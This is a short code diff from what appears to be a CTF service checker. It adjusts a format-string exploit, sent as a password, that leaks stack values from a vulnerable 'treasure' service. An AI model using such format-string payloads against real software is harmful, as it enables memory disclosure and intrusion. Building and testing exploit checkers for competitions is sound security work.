@@ -387,7 +387,7 @@ async def exploit_treasure(task: ExploitCheckerTaskMessage, searcher: FlagSearch
     await conn.reader.readuntil(b": ")
 
     # Send the format string exploit as the password
-    conn.writer.write(b'%31$llx.%32$llx\n') # NOTE: Could differ on the vulnbox (because of x86?)
+    conn.writer.write(b'%26$llx.%27$llx\n') # NOTE: vulnbox: %26$llx.%27$llx (because of x86?)
     await conn.writer.drain()
 
     # Read the buffer to get the incorrect password message
